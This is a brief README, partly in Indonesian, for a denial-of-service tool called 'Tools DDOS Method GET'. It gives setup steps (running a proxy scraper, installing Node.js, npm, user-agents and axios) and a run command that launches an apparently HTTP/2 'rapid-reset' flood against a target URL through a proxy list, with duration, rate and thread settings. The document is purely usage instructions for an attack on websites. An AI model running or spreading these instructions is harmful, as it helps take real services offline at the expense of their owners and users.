Tools DDOS Method GET

How to use :
- python3 scrape.py
- pilih n
- install nodejs (apt install nodejs)
- apt install npm
- npm i user-agents
- npm i axios


run : node rapid-reset GET 120 5 proxy.txt 64 https://target[dot]com/ 1
